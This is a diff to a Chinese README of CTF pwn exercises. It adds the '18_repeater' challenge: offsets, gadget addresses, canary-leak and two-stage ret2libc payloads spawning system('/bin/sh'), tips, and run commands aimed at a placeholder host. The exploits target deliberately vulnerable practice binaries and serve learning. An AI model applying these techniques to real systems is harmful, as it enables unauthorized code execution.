@@ -38,6 +38,7 @@
 | `11_2018_rop` | i386 / 动态 / not stripped | `read(0, buf, 0x100)`，`buf=ebp-0x88` | **140** | `write(1, write@got, 4)`，返回 `main` | `system("/bin/sh")` |
 | `12_bjdctf_2020_babyrop` | amd64 / 动态 / not stripped | `read(0, buf, 0x64)`，`buf=rbp-0x20` | **40** | leak `puts@got`，返回 `main` | `system("/bin/sh")` |
 | `13_putsorsys` | amd64 / 动态 / not stripped | menu + `read(0, buf, 0x100)`，canary | **0x38**（canary 0x28） | `%13$p` leak canary，`%9$s` leak `puts@got` | 保留 canary 后 `system("/bin/sh")` |
+| `18_repeater` | amd64 / 动态 / stripped | 循环 `read(0, buf, 0x100)` + `puts(buf)`，canary | **0x28**（canary 0x28，saved RIP 0x38） | `puts(buf)` 打 canary，再 `puts(read@got)` 回 `main` | `ret` 对齐后 `system("/bin/sh")` |
 
 关键地址：
 
@@ -48,6 +49,7 @@
 | `11_2018_rop` | `write@plt=0x80483A0`、`write@got=0x804A010`、`main=0x80484C6` |
 | `12_bjdctf_2020_babyrop` | `puts@plt=0x4004E0`、`puts@got=0x601018`、`pop rdi=0x400733`、`ret=0x4004C9`、`main=0x4006AD` |
 | `13_putsorsys` | `puts@got=0x404018`、`/bin/sh=0x40205E`、`pop rdi=libc+0x2A3E5`、`ret=libc+0x29CD6` |
+| `18_repeater` | `puts@plt=0x400610`、`read@got=0x601030`、`pop rdi;ret=0x400933`、`ret=0x400934`、`main=0x4007D9` |
 
 Payload 核心：
 
@@ -65,6 +67,17 @@ b"A" * OFFSET + p32(WRITE_PLT) + p32(MAIN) + p32(1) + p32(WRITE_GOT) + p32(4)
 
 # Stage 2
 b"A" * OFFSET + p32(SYSTEM) + p32(0xDEADBEEF) + p32(BINSH)
+```
+
+```python
+# 18_repeater：先 canary leak，再 ret2libc（64 位，No PIE）
+b"A" * 0x28 + b"B"          # canary 低字节被覆盖成非 0，puts 打出剩余 7 字节
+
+b"A" * 0x28 + p64(canary) + p64(0) \
+    + p64(POP_RDI) + p64(READ_GOT) + p64(PUTS_PLT) + p64(MAIN)
+
+b"A" * 0x28 + p64(canary) + p64(0) \
+    + p64(RET) + p64(POP_RDI) + p64(BINSH) + p64(SYSTEM)
 ```
 
 ---
@@ -97,6 +110,14 @@ b"A" * OFFSET + p32(SYSTEM) + p32(0xDEADBEEF) + p32(BINSH)
    原题按 Ubuntu 18.04 构建时，`libc6 2.27-3ubuntu1.6` 的偏移是：
    `puts=0x080970`、`system=0x04f420`、`/bin/sh=0x1b3d88`。
 
+7. **canary 题先泄 canary，别急着 ROP**
+   `puts(buf)` 这种“回显”型溢出，多发 1 个字节就能把 canary 打出来（18_repeater）。
+   `read` 可能短读，泄漏长度不对就直接重连，不要试图补救。
+
+8. **循环型程序要看 `scanf` 的语义**
+   `18_repeater` 里 `0` 表示继续循环、非 `0` 才走 `return`；
+   发错值会导致 ROP 永远不触发，看起来像“偏移算错了”。
+
 ---
 
 ## 4. 文件说明
@@ -109,11 +130,13 @@ b"A" * OFFSET + p32(SYSTEM) + p32(0xDEADBEEF) + p32(BINSH)
 | `11_2018_rop_speedrun.md` / `11_2018_rop_exp.py` | 32 位 `write` leak 模板（同 10，地址不同） |
 | `12_bjdctf_2020_babyrop_speedrun.md` / `12_bjdctf_2020_babyrop_exp.py` | 64 位 `puts` leak + `ret` 对齐 |
 | `13_putsorsys_speedrun.md` / `13_putsorsys_exp.py` | 格式化字符串 leak canary/puts + canary-safe ROP |
+| `18_repeater_speedrun.md` / `18_repeater_exp.py` | canary leak（`puts(buf)` 型）+ 两阶段 ret2libc，含短读重试 |
 | `[NewStarCTF 2023 公开赛道]ret2libc` | 07 的题目二进制 |
 | `jarvisoj_level4` | 10 的题目二进制 |
 | `铁人三项（第五赛区）2018_rop` | 11 的题目二进制 |
 | `bjdctf_2020_babyrop` | 12 的题目二进制 |
 | `putsorsys` / `libc.so.6` | 13 的题目二进制与附件 libc |
+| `repeater` | 18 的题目二进制（stripped，64 位） |
 
 > 这些题目都没有单独留 `writeup.md`；对应的 `speedrun.md` 已包含完整逆向、栈布局、gadget 与两阶段利用说明。
 
@@ -154,6 +177,11 @@ python 12_bjdctf_2020_babyrop_exp.py LOCAL
 LIBC=./libc.so.6 \
 LD_SO=/tmp/libc235/lib/x86_64-linux-gnu/ld-linux-x86-64.so.2 \
 LIBC_DIR=. python 13_putsorsys_exp.py LOCAL
+
+# 18：canary leak + ret2libc（64 位，No PIE，stripped）
+python 18_repeater_exp.py LOCAL
+LIBC=./libc-2.27.so HOST=target.example.com PORT=9999 \
+python 18_repeater_exp.py
 ```
 
 CTF² 等 TLS 平台：
@@ -172,6 +200,11 @@ read/gets 栈溢出 + No canary + No PIE
 + 没有 system@plt
 + 有 puts@plt / puts@got
 = 先 leak puts，再回 main，最后 system("/bin/sh")
+```
+
+```text
+Canary + read(0, buf, N) + puts(buf) 回显
+= 先靠回显把 canary 打出来（低字节改非 0），再走同样的两阶段
 ```
 
 一句话：**Stage 1 只负责 leak 和回 `main`；Stage 2 才打 `system`。别把 `See you next time` 当 leak。**
